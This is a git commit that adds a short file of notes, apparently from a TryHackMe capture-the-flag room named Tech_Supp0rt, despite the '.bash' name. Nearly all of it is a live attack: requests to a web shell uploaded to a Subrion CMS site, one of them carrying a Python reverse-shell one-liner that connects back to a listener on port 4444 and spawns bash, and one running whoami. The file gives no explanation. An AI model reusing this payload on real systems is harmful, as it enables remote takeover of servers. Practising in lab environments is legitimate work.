0675a8bb30c73b2c015c92ea77b49741caf0b93e
Kitsana Thuekoh <kitsanathuekoh@gmail.com>
2026-08-13 12:23:59 +0200

    Create script.bash

---
+++ Tech_Supp0rt: 1{THM}/script.bash
@@ -0,0 +1,6 @@
+Reverse Trigger {CMS}
+http://10.129.159.67/subrion/uploads/shell.phar?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.156.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn("/bin/bash")'
+
+http://10.129.159.67/subrion/uploads/shell.phar?cmd=whoami
+
+http://10.129.159.67/subrion/panel/uploads/#elf_l1_Lw
